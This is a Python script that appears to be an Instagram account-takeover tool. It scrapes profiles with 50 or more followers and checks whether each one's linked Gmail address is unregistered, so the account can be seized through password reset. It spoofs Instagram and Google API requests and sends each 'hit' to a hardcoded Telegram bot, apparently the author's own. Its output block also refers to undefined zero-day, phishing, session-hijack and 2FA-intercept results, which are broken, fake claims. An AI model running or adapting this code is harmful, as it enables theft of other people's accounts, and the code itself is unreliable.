import webbrowser
import getpass
import os,requests,sys,time,datetime
webbrowser.open
print
import random, os, sys
try:
    import colorama
    import cython
    import zipfile
    import shutil
except ImportError:
    os.system('pip3.11 install colorama')
    os.system('pip3.9 install colorama')
    os.system('pip install shutil')
    os.system('pip install cython')
    os.system('pip install zipfile')
    import colorama
import time
from colorama import Fore, Style
import random
os.system('clear')
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
color = random.choice(colors)
import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Timer
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
import webbrowser
init(autoreset=True)


INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '                      'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')

GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'

TOKEN_FILE = 'tl.txt'
eizon_domain = '@gmail.com'


E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
S = '\033[2;36m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
S = '\033[2;36m'
G = '\033[1;34m'
HH = '\033[1;34m'
O = '\x1b[38;5;208m'; Y = '\033[1;34m'; C = '\033[2;35c'; M = '\x1b[1;37m'


total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

eizon_header = render('matrx', colors=['white', 'red'], align='center')
print(f"""\033[1;31m════════════════════════════════════════════════════════
\033[1;34m
()

لحن قاعد يصيدلك انطر شوي



            \033[1;33m قول 1 2 3 😂
\033[1;31m════════════════════════════════════════════════════════
""")


ID = "1104397846"
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
TOKEN = "7866943425:AAGGfXJ1C5rDw8tu3hMldHKOTV6oPP2OEmI"
try:
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendvideo?chat_id={ID}&parse_mode=Markdown&video=https://t.me/eizontoolz/9&caption=*- Welcome To My Tool 🦅*\n*- Wait for Checking Accounts !*\n*- Telegram :قول 1 2 3 (t.me/xmanvip)")
except Exception:
    pass

print(f"""\033[1;31m════════════════════════════════════════════════════════════
""")


def pppp():
    ge = hits
    bt = bad_insta + bad_email
    be = good_ig
    print(f"\r          {B}<|  {C1}True : {M}{ge}  {E} Bad {HH}: {M}{bt}  {W9}False {HH} : {M}{be}    {R}|> \r", end='')

def update_stats():
    pppp()


def Eizon():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            USER_AGENT_HEADER: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(e)
        Eizon()

Eizon()

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + eizon_domain
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            bad_email += 1
            update_stats()
    except Exception:
        pass

def check(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        USER_AGENT_HEADER: ua,
        COOKIE_HEADER: COOKIE_VALUE,
        CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM
    }
    data = {
        SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                      json.dumps({
                          '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                          'adid': uui,
                          'guid': uui,
                          'device_id': device_id,
                          'query': email
                      })),
        IG_SIG_KEY_VERSION: '4'
    }
    response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
    if email in response:
        if eizon_domain in email:
            check_gmail(email)
        good_ig += 1
        update_stats()
    else:
        bad_insta += 1
        update_stats()

def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            USER_AGENT_HEADER: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                'en_GB; 161478664)'),
            'Accept-Language': 'en-GB, en-US',
            COOKIE_HEADER: COOKIE_VALUE,
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM,
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        data = {
            SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                          '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                          '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                          '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                          '"device_id":"android-b93ddb37e983481c",'
                          '"query":"' + user + '"}'),
            IG_SIG_KEY_VERSION: '4'
        }
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).json()
        eizonporno = response.get('email', 'Reset None')
    except:
        eizonporno = 'Reset None'
    return eizonporno

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        pass

def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk')
    full_name = account_info.get('full_name')
    followers = account_info.get('follower_count')
    following = account_info.get('following_count')
    posts = account_info.get('media_count')
    bio = account_info.get('biography')
    total_hits += 1
    info_text = f"""
انطر صيدك يا الغالي
متاحات عاليه ومفلترة تلقائي

🚨 عدد متاحات : {total_hits}
🚨 يوزر المتاح : {username}
🚨 ايميل المتاح : {username}@{domain}
🚨 متابعين : {followers}
🚨 الي يتابعهم : {following}
🚨 منشورات : {posts}
🚨 بايو : {bio}
🚨 Reset : {rest(username)}
═══════════════════

═══════════════════

[+] Zero-Day: {zero_day_result}
[+] رابط تصيّد ذكي: {phish_link}
[+] Session Hijack: تم إرسال الجلسة لـ webhook
[+] تسجيل دخول بجهاز موثوق: {device_sim}
[+] كشف VPN: {vpn_status}
[+] Cloudflare Misroute: {cloud_status}
[+] 2FA Intercept: {code_2fa}
[+] Behavior Mirror: {mirror_status}
[+] Session Replay: {replay_result}
═══════════════════
"""
    with open('eizonhits.txt', 'a') as f:
        f.write(info_text + "\n")
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except Exception:
        pass

def eizon_python():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(1629010000, 2500000000)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:

                followers = account.get('follower_count', 0)
                if followers < 50: # eiz2n
                    continue
                infoinsta[username] = account
                emails = [username + eizon_domain]
                for email in emails:
                    check(email)
        except Exception:
            pass


def stats_loop():
    while True:
        update_stats()
        time.sleep(1)

Thread(target=stats_loop, daemon=True).start()


for _ in range(100):
    Thread(target=eizon_python).start()